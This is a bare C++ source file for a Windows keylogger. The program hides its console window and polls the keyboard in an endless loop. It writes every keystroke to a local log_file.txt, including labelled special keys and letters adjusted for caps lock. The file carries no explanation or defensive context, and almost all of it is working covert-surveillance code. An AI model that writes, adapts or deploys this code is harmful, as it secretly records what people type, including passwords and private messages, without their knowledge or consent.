#include <iostream>
#include <windows.h>
#include <fstream>
#include <bits/stdc++.h>

using namespace std;

string Log_File="log_file.txt";

void SaveInFile(string Information){
    fstream logFile;
    logFile.open(Log_File,ios::app);
    logFile << Information;
    logFile.close();
}

string SpecialKeys(int key) {
    string result;
    switch (key) {
        case VK_SPACE:
            result = " ";
            break;
        case VK_RETURN:
            result = "[RETURN]";
            break;
        case VK_BACK:
            result = "[BACKSPACE]";
            break;
        case VK_TAB:
            result = "[TAB]";
            break;
        case VK_CAPITAL:
            result = "[CAPS LOCK]";
            break;
        case VK_ESCAPE:
            result = "[ESC]";
            break;
        case VK_SHIFT:
            result = "[SHIFT]";
            break;
        case VK_CONTROL:
            result = "[CTRL]";
            break;
        case VK_MENU:
            result = "[ALT]";
            break;
        case VK_LWIN:
        case VK_RWIN:
            result = "[WIN]";
            break;
        case VK_APPS:
            result = "[APPS]";
            break;
        case VK_SNAPSHOT:
            result = "[PRINT SCREEN]";
            break;
        case VK_SCROLL:
            result = "[SCROLL LOCK]";
            break;
        case VK_PAUSE:
            result = "[PAUSE]";
            break;
        case VK_INSERT:
            result = "[INS]";
            break;
        case VK_HOME:
            result = "[HOME]";
            break;
        case VK_PRIOR:
            result = "[PAGE UP]";
            break;
        case VK_DELETE:
            result = "[DEL]";
            break;
        case VK_END:
            result = "[END]";
            break;
        case VK_NEXT:
            result = "[PAGE DOWN]";
            break;
        case VK_LEFT:
            result = "[LEFT]";
            break;
        case VK_UP:
            result = "[UP]";
            break;
        case VK_RIGHT:
            result = "[RIGHT]";
            break;
        case VK_DOWN:
            result = "[DOWN]";
            break;
        case VK_SELECT:
            result = "[SELECT]";
            break;
        case VK_EXECUTE:
            result = "[EXECUTE]";
            break;
        case VK_HELP:
            result = "[HELP]";
            break;
        case VK_SLEEP:
            result = "[SLEEP]";
            break;
        case VK_NUMLOCK:
            result = "[NUM LOCK]";
            break;
        case VK_BROWSER_BACK:
            result = "[BROWSER BACK]";
            break;
        case VK_BROWSER_FORWARD:
            result = "[BROWSER FORWARD]";
            break;
        case VK_BROWSER_REFRESH:
            result = "[BROWSER REFRESH]";
            break;
        case VK_BROWSER_STOP:
            result = "[BROWSER STOP]";
            break;
        case VK_BROWSER_SEARCH:
            result = "[BROWSER SEARCH]";
            break;
        case VK_BROWSER_FAVORITES:
            result = "[BROWSER FAVORITES]";
            break;
        case VK_BROWSER_HOME:
            result = "[BROWSER HOME]";
            break;
        case VK_VOLUME_MUTE:
            result = "[VOLUME MUTE]";
            break;
        case VK_VOLUME_DOWN:
            result = "[VOLUME DOWN]";
            break;
        case VK_VOLUME_UP:
            result = "[VOLUME UP]";
            break;
        case VK_MEDIA_NEXT_TRACK:
            result = "[MEDIA NEXT TRACK]";
            break;
        case VK_MEDIA_PREV_TRACK:
            result = "[MEDIA PREV TRACK]";
            break;
        case VK_MEDIA_STOP:
            result = "[MEDIA STOP]";
            break;
        case VK_MEDIA_PLAY_PAUSE:
            result = "[MEDIA PLAY/PAUSE]";
            break;
        case VK_LAUNCH_MAIL:
            result = "[LAUNCH MAIL]";
            break;
        case VK_LAUNCH_MEDIA_SELECT:
            result = "[LAUNCH MEDIA SELECT]";
            break;
        case VK_LAUNCH_APP1:
            result = "[LAUNCH APP1]";
            break;
        case VK_LAUNCH_APP2:
            result = "[LAUNCH APP2]";
            break;
        default:
            break;
    }
    return result;
}

int main() {
    int special_Key[] = {VK_MENU, VK_LAUNCH_APP2, VK_LAUNCH_APP1, VK_LAUNCH_MEDIA_SELECT, VK_LAUNCH_MAIL, VK_MEDIA_PLAY_PAUSE, VK_MEDIA_STOP, VK_MEDIA_PREV_TRACK, VK_MEDIA_NEXT_TRACK, VK_VOLUME_MUTE, VK_VOLUME_DOWN, VK_VOLUME_UP, VK_BROWSER_HOME, VK_BROWSER_FAVORITES, VK_BROWSER_SEARCH, VK_BROWSER_STOP, VK_BROWSER_REFRESH, VK_BROWSER_FORWARD, VK_BROWSER_BACK, VK_NUMLOCK, VK_SLEEP, VK_HELP, VK_EXECUTE, VK_SELECT, VK_DOWN, VK_RIGHT, VK_UP, VK_LEFT, VK_NEXT, VK_END, VK_DELETE, VK_PRIOR, VK_HOME, VK_INSERT, VK_PAUSE, VK_SCROLL, VK_SNAPSHOT, VK_APPS, VK_RWIN, VK_LWIN, VK_MENU, VK_CONTROL, VK_SHIFT, VK_ESCAPE, VK_CAPITAL, VK_TAB, VK_BACK, VK_RETURN, VK_SPACE};
    string specialK;
    bool isSpecial;
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);
    while (1){
        for(int i = 8 ; i <= 190 ; i++){
            if(GetAsyncKeyState(i) == -32767){
                isSpecial = std::find(std::begin(special_Key),std::end(special_Key),i) != std::end(special_Key);
                if(isSpecial){
                    specialK = SpecialKeys(i);
                    SaveInFile(specialK);
                }
                else{
                    if(GetKeyState(VK_CAPITAL)){
                        SaveInFile(string(1,(char) i));
                    }else{
                        SaveInFile(string(1, (char)std::tolower(i)));
                    }
                }

            }
        }
    }
    return 0;
}
